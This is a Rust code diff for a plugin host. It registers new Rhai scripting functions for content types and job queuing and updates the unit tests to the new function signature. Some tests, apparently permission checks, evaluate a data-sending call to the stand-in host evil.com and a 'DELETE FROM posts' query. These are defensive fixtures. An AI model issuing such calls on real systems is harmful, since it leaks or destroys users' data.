@@ -24,8 +24,12 @@ pub fn register_host_functions(
     permissions: Permissions,
     pool: Option<Pool>,
     event_bus: Option<crate::eventbus::EventBus>,
+    content_registry: Option<std::sync::Arc<crate::content_type::ContentTypeRegistry>>,
 ) {
     let mut hc_inner = HostContext::new("rhai", config, plugin_id, permissions, pool);
+    if let Some(registry) = content_registry {
+        hc_inner.set_content_type_registry(registry);
+    }
     if let Some(bus) = event_bus {
         hc_inner.set_event_bus(bus);
     }
@@ -84,6 +88,42 @@ pub fn register_host_functions(
     let hc = host_ctx.clone();
     engine.register_fn("dbQuery", move |sql: &str, params: &str| -> String {
         hc.db_query(sql, params)
+    });
+
+    // ── Content-type host API (`ct.*`, group-aware names) ─────────────
+    let hc = host_ctx.clone();
+    engine.register_fn("ctFind", move |ct: &str, query: &str| -> String {
+        hc.ct_find(ct, query)
+    });
+
+    let hc = host_ctx.clone();
+    engine.register_fn("ctGet", move |ct: &str, id: &str| -> String {
+        hc.ct_get(ct, id)
+    });
+
+    let hc = host_ctx.clone();
+    engine.register_fn("ctCreate", move |ct: &str, data: &str| -> String {
+        hc.ct_create(ct, data)
+    });
+
+    let hc = host_ctx.clone();
+    engine.register_fn(
+        "ctUpdate",
+        move |ct: &str, id: &str, data: &str| -> String { hc.ct_update(ct, id, data) },
+    );
+
+    // ── Job / integration host API ───────────────────────────────────
+    let hc = host_ctx.clone();
+    engine.register_fn(
+        "jobEnqueue",
+        move |job_type: &str, payload: &str, opts: &str| -> String {
+            hc.job_enqueue(job_type, payload, opts)
+        },
+    );
+
+    let hc = host_ctx.clone();
+    engine.register_fn("getReceipt", move |trace_id: &str| -> String {
+        hc.ingress_get_receipt(trace_id)
     });
 
     let hc = host_ctx.clone();
@@ -263,7 +303,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let result: () = engine.eval(r#"log("info", "test")"#).unwrap();
 
@@ -278,7 +326,15 @@ mod tests {
             config: vec!["app.*".into()],
             ..Permissions::default()
         };
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let env = engine
             .eval::<rhai::Dynamic>(r#"getConfig("app.env")"#)
@@ -313,7 +369,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let result = engine
             .eval::<rhai::Dynamic>(r#"getData("some.key")"#)
@@ -326,7 +390,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let result: String = engine
             .eval(r#"httpPost("https://evil.com", "{}")"#)
@@ -339,7 +411,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let result = engine
             .eval::<rhai::Dynamic>(r#"getPost("some-slug")"#)
@@ -352,7 +432,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let _: () = engine.eval(r#"log("info", "test")"#).unwrap();
         let _ = engine.eval::<rhai::Dynamic>(r#"getConfig("k")"#).unwrap();
@@ -392,7 +480,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let result: String = engine
             .eval(r#"dbQuery("DELETE FROM posts", "[]")"#)
@@ -405,7 +501,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let result: String = engine
             .eval(r#"to_json(parse_json(`{"title":"hello"}`))"#)
@@ -418,7 +522,15 @@ mod tests {
         let mut engine = Engine::new();
         let config = make_test_config();
         let perms = Permissions::default();
-        register_host_functions(&mut engine, config, "test-plugin".into(), perms, None, None);
+        register_host_functions(
+            &mut engine,
+            config,
+            "test-plugin".into(),
+            perms,
+            None,
+            None,
+            None,
+        );
 
         let upper: String = engine.eval(r#"to_upper("hello")"#).unwrap();
         assert_eq!(upper, "HELLO");
